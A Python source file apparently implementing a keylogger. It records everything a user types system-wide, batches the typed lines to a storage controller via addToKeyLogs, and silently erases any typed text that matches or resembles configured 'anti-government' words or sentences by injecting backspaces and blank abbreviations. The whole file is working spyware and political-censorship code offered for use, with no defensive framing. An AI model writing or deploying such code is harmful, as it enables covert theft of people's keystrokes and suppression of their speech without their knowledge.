from typing import List
import keyboard
import time
from difflib import SequenceMatcher

SHIFT_PUNCTUATION = ['!', '"', '§', '$', '%', '&', '/', '(', ')', '=', '?', ';', ':', '_', '`', '*', '\'']

def containes(line: str, sub: str):
    try:
        index = line.index(sub)
        return True
    except:
        return False

def wpm(lines: List[str], recordingEnd, recordingStart):
    words = []
    for line in lines:
        words.extend(line.split(" "))
    words = list(filter(None, words))
    wordsPerMinute = len(words) / ((recordingEnd - recordingStart) / 60)
    return wordsPerMinute

def similar(a: str, b: str):
    return SequenceMatcher(None, a, b).ratio() > 0.75

def moveRight(len: int):
    for i in range(0, len):
        keyboard.press_and_release("right")

def moveLeft(len: int):
    for i in range(0, len):
        keyboard.press_and_release("left")

def moveUp(len: int):
    for i in range(0, len):
        keyboard.press_and_release("up")

def moveDown(len: int):
    for i in range(0, len):
        keyboard.press_and_release("down")

def moveToUpperRightLineEnd():
    moveUp(1)
    keyboard.press_and_release("end")

class KeyLogger():
    def __init__(self, queryController, antiGovernmentWords: List[str], antiGovernmentSentences: List[str]):
        self.queryController = queryController
        self.censorWords = antiGovernmentWords
        self.censorSentences = antiGovernmentSentences
        self.logged = []

    def correctWord(self, wrongWord: str, correctWord: str):
        self.deleteWord(wrongWord)
        self.write(correctWord+" ")
        return True

    def write(self, string: str):
        for c in string:
            if c.isupper() or c in SHIFT_PUNCTUATION:
                keyboard.press("shift")
                keyboard.press_and_release(f'{c.lower()}')
                keyboard.release("shift")
            else:
                keyboard.press_and_release(f'{c}')

    def censorOutput(self, line: str):
        for badString in self.censorSentences:
            index = line.find(badString)
            if index > -1:
                self.deleteLine(line)
        for badWord in self.censorWords:
            if line.find(badWord) >= 0:
                self.deleteLine(line)

    def evaluateKeyUsage(self, stringList: List[str]):
        keyEvaluation = {}
        for str in stringList:
            for c in str:
                keyEvaluation[c] = str.count(c)
        return keyEvaluation

    def deleteWord(self, word: str):
        length = len(word)
        for _ in range(0, length):
            keyboard.press_and_release("backspace")
        keyboard.press_and_release("delete")
        return True

    def deleteLine(self, line: str):
        length = len(line)
        for _ in range(0, length+1):
            keyboard.press_and_release("backspace")

    def checkWordInSentence(self, sentence: str):
        words = sentence.split(" ")
        foundWords = []
        for word in words:
            for anitWord in self.censorWords:
                if similar(word, anitWord):
                    foundWords.append(word)
        return foundWords

    def checkSentences(self, sentences: List[str]):
        foundSentences = []
        for sentence in sentences:
            for antiSentence in self.censorSentences:
                if similar(sentence, antiSentence):
                    foundSentences.append(sentence)
        return foundSentences

    def readKeyInput(self):
        for badWord in self.censorWords:
            keyboard.add_abbreviation(badWord, "")
        for badSentence in self.censorSentences:
            keyboard.add_abbreviation(badSentence, "")
        keyboard.remap_key("tab", "space+space+space+space")
        while 1:
            lines = []
            recordingStart = time.time()
            keyboard.start_recording()
            keyboard.wait("enter")
            keyEvents = keyboard.stop_recording()
            recordingEnd = time.time()
            typedStrings = keyboard.get_typed_strings(keyEvents)
            for line in typedStrings:
                lines.append(line)
                if containes(line, "konami"):
                    return
            self.censorOutput(lines[0])
            keyEvaluation = self.evaluateKeyUsage(lines)
            print(keyEvaluation)
            print(wpm(lines, recordingEnd, recordingStart))
            yield lines[0]
    
    def main(self):
        input = self.readKeyInput()
        log = []
        counter = 0
        for i in input:
            log.append(i)
            if counter % 5 == 0:
                print(log)
                self.queryController.addToKeyLogs(log)
                counter = 0
                log.clear()
            counter = counter + 1